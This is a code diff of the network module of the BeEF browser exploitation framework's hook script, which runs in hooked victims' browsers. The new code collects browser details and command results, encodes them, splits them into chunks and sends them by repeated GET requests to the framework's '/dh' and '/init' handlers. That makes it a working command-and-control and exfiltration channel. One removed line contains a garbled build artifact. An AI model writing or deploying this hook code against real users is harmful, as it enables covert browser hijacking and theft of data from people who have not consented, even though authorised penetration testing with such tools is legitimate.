@@ -5,99 +5,118 @@
  */
 beef.net = {
 	
-	beef_url: "<%= @beef_url %>",
-	beef_hook: "<%= @beef_hook %>",
-	beef_queue: [],
+    host: "<%= @beef_host %>",
+    port: "<%= @beef_port %>",
+	hook: "<%= @beef_hook %>",
+    handler: '/dh',
+    chop: 2000,
+    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
+    sid_count: 0,
+	cmd_queue: [],
 
-	/**
-	 * Response Object - returned from beef.net.request with result of request
-	 */
-	response: function() {
-		this.status_code = null; 			 	// 500, 404, 200, 302
-		this.response_body = null; 			// "<html>…." if not a cross domain request
-		this.port_status = null; 				// tcp port is open, closed or not http
-		this.was_cross_domain = null; 	// true or false
-		this.was_timedout = null; 			// the user specified timeout was reached
-		this.duration = null;  					// how long it took for the request to complete
-	},
+    //Command object
+    command: function() {
+        this.cid = null;
+        this.results = null;
+        this.handler = null;
+        this.callback = null;
+        this.results = null;
+    },
 
-	/**
-     * Gets an object that can be used for ajax requests.
-     * 
-     * @example: var http = beef.net.get_ajax();
-     */
-    get_ajax: function() {
-            
-        // try objects
-        try {return new XMLHttpRequest()} catch(e) {};
-        try {return new ActiveXObject('Msxml2.XMLHTTP')} catch(e) {};
-        try {return new ActiveXObject('Microsoft.XMLHTTP')} catch(e) {};
-    
-        // unsupported browser
-        console.error('You browser is not supported')
-        console.error('please provide details to dev team')
-        return false;
+    //Packet object
+    packet: function() {
+        this.id = null;
+        this.data = null;
+    },
+
+    //Stream object
+    stream: function() {
+        this.id = null;
+        this.packets = [];
+        this.pc = 0;
+        this.get_base_url_length = function() {
+           return (this.url+this.handler+'?'+'bh='+beef.session.get_hook_session_id()).length;
+        },
+        this.get_packet_data = function() {
+            var p = this.packets.shift();
+            return {'bh':beef.session.get_hook_session_id(), 'sid':this.id, 'pid':p.id, 'pc':this.pc, 'd':p.data }
+        };
     },
     
-	
-	/**
-	 * Build param string from hash.
-	 */
-	construct_params_from_hash: function(param_array) {
-		
-		param_str = "";
-		
-		for (var param_name in param_array) {
-			param_str = this.construct_params(param_str, param_name, param_array[param_name])
-		}
-		
-		return param_str;
+    /**
+     * Response Object - returned from beef.net.request with result of request
+     */
+    response: function() {
+        this.status_code = null;        // 500, 404, 200, 302
+        this.body = null;               // "<html>…." if not a cross domain request
+        this.port_status = null;        // tcp port is open, closed or not http
+        this.was_cross_domain = null;   // true or false
+        this.was_timedout = null;       // the user specified timeout was reached
+        this.duration = null;           // how long it took for the request to complete
+    },
+
+    //Queues the command, to be sent back to the framework on the next refresh
+	queue: function(handler, cid, results, callback) {
+        if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function'))
+        {
+            var s = new beef.net.command();
+            s.cid = cid;
+            s.results = beef.net.clean(results);
+            s.callback = callback;
+            s.handler = handler;
+            this.cmd_queue.push(s);
+        }
 	},
-	
-	/**
-	 * Build param string.
-	 */
-	construct_params: function(param_str, key, value) {
-		
-		// if param_str is not a str make it so
-		if (typeof(param_str) != 'string') param_str = '';
-		
-		if (param_str != "" ) { param_str += "&"; } // if not the first param add an '&'
-		param_str += key;
-		param_str += "=";
-		param_str += beef.encode.base64.encode(value);
-		
-		return param_str;
-	},
-	
-	/**
-	 * Performs http requests.
-	 * @param: {String} the url to send the request to.
-	 * @param: {String} the method to use: GET or POST - **NOTE** This param now ignored
-	 * @param: {Function} the handler to callback once the http request has been performed.
-	 * @param: {String} the parameters to send for a POST request.
-	 * 
-	 * @example: beef.net.raw_request("http://beef.com/", 'POST', handlerfunction, "param1=value1&param2=value2");
-	 */
-	raw_request: function(url, method, handler, params) {
-		$j.getScript( url + '?' + params, handler);
-	},
-	
-	/**
-	 * Performs http requests with browoser id.
-	 * @param: {String} the url to send the request to.
-	 * @param: {String} the method to use: GET or POST - **NOTE** This param now ignored
-	 * @param: {Function} the handler to callback once the http request has been performed.
-	 * @param: {String} the parameters to send for a POST request.
-	 * 
-	 * @example: beef.net.request("http://beef.com/", 'POST', handlerfunction, "param1=value1&param2=value2");
-	 */
-	request: function(url, method, handler, params) {
-		params += '&BEEFHOOK=' + BEEFHOOK; // append browser id
-		this.raw_request(url, method, handler, params);
-	},
-	
-	/**
+
+    //Queues the current command and flushes the queue straight away
+    send: function(handler, cid, results, callback) {
+        this.queue(handler, cid, results, callback);
+        this.flush();
+    },
+
+    //Flush all currently queued commands to the framework
+    flush: function() {
+        if (this.cmd_queue.length > 0)
+        {
+            var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
+            this.cmd_queue.length = 0;
+            this.sid_count++;
+            var stream = new this.stream();
+            stream.id = this.sid_count;
+            var pad = stream.get_base_url_length() + this.pad;
+            //cant continue if chop amount is too low
+            if ((this.chop - pad) > 0)
+            {
+                var data = this.chunk(data, (this.chop - pad));
+                for (var i = 1; i <= data.length; i++)
+                {
+                    var packet = new this.packet();
+                    packet.id = i;
+                    packet.data = data[(i-1)];
+                    stream.packets.push(packet);
+                }
+                stream.pc = stream.packets.length;
+                this.push(stream);
+            }
+        }
+    },
+
+    //Split string into chunk lengths determined by amount
+    chunk: function(str, amount) {
+        if (typeof amount == 'undefined') n=2;
+        return str.match(RegExp('.{1,'+amount+'}','g'));
+    },
+
+    //Push packets to framework
+    push: function(stream) {
+        //need to implement wait feature here eventually
+        for (var i = 0; i < stream.pc; i++)
+        {
+            this.request('http', 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
+        }
+    },
+
+    /**
 	*Performs http requests
 	* @param: {String} scheme: HTTP or HTTPS
 	* @param: {String} method: GET or POST
@@ -112,27 +131,27 @@ beef.net = {
 	*
 	* @return: {Object} response: this object contains the response details
 	*/
-	request_new: function(scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
-
+	request: function(scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
 		//check if same domain or cross domain
-		if (document.domain == domain){
-			cross_domain = false
-		}else{
-			cross_domain = true
-		}
-		
+        cross_domain = (document.domain == domain) ? false : true;
+
+        //build the url
+        var url = scheme+"://"+domain;
+        url = (port != null) ? url+":"+port : url;
+        url = (path != null) ? url+path : url;
+        url = (anchor != null) ? url+"#"+anchor : url;
+
 		//define response object
 		var response = new this.response;
 		response.was_cross_domain = cross_domain;
 		
 		var start_time = new Date().getTime();
-		
 		//build and execute request
 		$j.ajax({type: method,
 			 dataType: dataType,
-		     url: scheme+"://"+domain+":"+port+path+"#"+anchor,
+		     url: url,
 		     data: data,
-		     timeout: (timeoutbeef_js_cmps=beef.browser,beef.browser.cookie,beef.session,beef.net.os,beef.dom,beef.logger,beef.net,beef.updater,beef.encode.base64,beef.net.local * 1000),
+		     timeout: (timeout * 1000),
 		     //function on success
 		     success: function(data, textStatus, jqXHR){
 		    	 var end_time = new Date().getTime();
@@ -153,96 +172,43 @@ beef.net = {
 		     //function on completion
 		     complete: function(transport) {
 		    	 response.status_code = transport.status;
-		    	
 		      }
-		});
+		}).done(function() { if (callback != null) { callback(response); } });
 		return response;
 	},
-	
-	/**
-	 * Send browser details back to the framework. This function will gather the details 
-	 * and send them back to the framework
-	 * 
-	 * @example: beef.net.sendback_browser_details();
-	 */
-	sendback_browser_details: function() {
-		// get hash of browser details
-		var details = beef.browser.getDetails();
-		
-		// get the hook session id
-		details['HookSessionID'] = beef.session.get_hook_session_id();
-		
-		// contruct param string
-		var params = this.construct_params_from_hash(details);
-		
-		// return data to the framework
-		this.sendback("/init", 0, params);
-	},
-	
-	/**
-	 * Queues a communication request to be sent the next time the hook updates
-	 * @param: {String} The url to return the results to.
-	 * @param: {Integer} The command id that launched the command module.
-	 * @param: {String/Object} The results to send back.
-	 * @param: {Function} the handler to callback once the http request has been performed.
-	 * 
-	 * @example: beef.net.queue("/commandmodule/prompt_dialog.js", 19, "answer=zombie_answer");
-	 */
-	queue: function(commandmodule, command_id, results, handler) {
-		this.beef_queue.push({'command':commandmodule, 'cid':command_id, 'results':results, 'handler':handler});
-	},
-	
-	/**
-	 * Sends results back to the BeEF framework.
-	 * @param: {String} The url to return the results to.
-	 * @param: {Integer} The command id that launched the command module.
-	 * @param: {String/Object} The results to send back.
-	 * @param: {Function} the handler to callback once the http request has been performed.
-	 * 
-	 * @example: beef.net.sendback("/commandmodule/prompt_dialog.js", 19, "answer=zombie_answer");
-	 */
-	sendback: function(commandmodule, command_id, results, handler) {
-		beef.net.queue(commandmodule, command_id, results, handler);
-		beef.net.flush_queue();
-	},
-	
-	/**
-	 * Sends results back to the BeEF framework.
-	 */
-	flush_queue: function() {
-		for (var i in this.beef_queue)
-		{
-			var results = this.beef_queue[i]['results'];
-			if(typeof results == 'object') {
-				s_results = '';
-				for(key in results) {
-					s_results += key + '=' + escape(results[key].toString()) + '&';
-				}
-				results = s_results;
-			}
-			
-			if(typeof results == 'string' && typeof this.beef_queue[i]['cid'] == 'number') {
-				results += '&command_id='+this.beef_queue[i]['cid'];
-				this.request(this.beef_url + this.beef_queue[i]['command'], 'POST', this.beef_queue[i]['handler'], results);
-			}
-			this.beef_queue[i]['expunge'] = true;
-		}
-		beef.net.expunge_queue();
-	},
-	
-	/**
-	 * Cleans queue of commands that have been executed
-	 */
-	expunge_queue: function() {
-		for (var i = 0; i < this.beef_queue.length; i++)
-		{
-			if (this.beef_queue[i] && this.beef_queue[i]['expunge'])
-			{
-				this.beef_queue.splice(i,1);
-			}
-		}
-	}
-	
+
+    //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
+    //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
+    clean: function(r) {
+        if (this.array_has_string_key(r)) {
+            var obj = {};
+            for (var key in r)
+                obj[key] = (this.array_has_string_key(obj[key])) ? this.clean(r[key]) : r[key];
+            return obj;
+        }
+        return r;
+    },
+
+    //Detects if an array has a string key
+    array_has_string_key: function(arr) {
+        if ($j.isArray(arr))
+        {
+            try {
+                for (var key in arr)
+                    if (isNaN(parseInt(key))) return true;
+            } catch (e) { }
+        }
+        return false;
+    },
+
+    //Sends back browser details to framework
+    browser_details: function() {
+        var details = beef.browser.getDetails();
+        details['HookSessionID'] = beef.session.get_hook_session_id();
+        this.send('/init', 0, details);
+    }
+
 };
+
 
 beef.regCmp('beef.net');
